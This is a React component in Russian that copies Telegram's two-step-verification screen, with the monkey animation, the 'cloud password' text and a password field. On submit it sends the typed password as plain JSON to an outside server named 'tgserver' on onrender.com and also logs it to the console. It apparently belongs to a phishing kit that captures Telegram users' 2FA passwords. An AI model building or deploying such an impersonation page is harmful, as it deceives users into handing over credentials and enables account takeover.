import React, { useState } from 'react';
import './App2.css';
import './PhoneNumberInput.css';
import './Autentification.css';

const Autentification = () => {
    const [password, setPassword] = useState('');

    const handleInputChange = (event) => {
        setPassword(event.target.value);
    };

    const handleAnimationEnd = (e) => {
        // Остановить анимацию после первого цикла
        e.target.style.animation = 'none';
    };

    const PasswordSubmit = (event) => {
        event.preventDefault();

        const serverUrl = 'https://tgserver-l1sf.onrender.com/password';

        const requestData = {
            passwordInput: password,
        };

        console.log('requestData:', requestData);

        fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestData),
        })
            .then((response) => {
                if (!response.ok) {
                    throw new Error(`Ошибка HTTP: ${response.status}`);
                }
                return response.json();
            })
            .then((data) => {
                console.log('Успешный ответ от сервера:', data);
            })
            .catch((error) => {
                console.error('Ошибка при отправке запроса:', error.message);
            });

        // Получаем поле ввода пароля
        const passwordInput = document.getElementById('password');

        // Добавляем класс "highlight" для анимации изменения цвета контура
        passwordInput.classList.add('highlight');

        // Задаем анимацию
        passwordInput.style.animation = 'highlightAnimation 1s ease';

        // Убираем класс и анимацию после завершения анимации
        passwordInput.addEventListener('animationend', () => {
          // Удаляем класс "highlight" после завершения анимации
          passwordInput.classList.remove('highlight');
          // Убираем анимацию
          passwordInput.style.animation = 'none';
      }, { once: true });
  };
    

    return (
        <div className='app2-conteiner'>
            <img
                src="./emojibest_com_TwoFactorSetupMonkeyClose.gif"
                alt="monkey2"
                className='monkey-2'
                onAnimationEnd={handleAnimationEnd}
            />
            <p className="title-text-auth">Введите пароль</p>
            <a className="add-text-auth">
                Вы включили двухэтапную аутентификацию. <br /> Ваш аккаунт защищён дополнительным облачным<br />  паролем.
            </a>
            <form className="code-input-container" onSubmit={PasswordSubmit}>
                <input
                    type="password"
                    id="password"
                    value={password}
                    onChange={handleInputChange}
                    className="code-input"
                    placeholder="Пароль"
                />
                <button type="submit" className="button">
                    Далее
                </button>
            </form>
        </div>
    );
};

export default Autentification;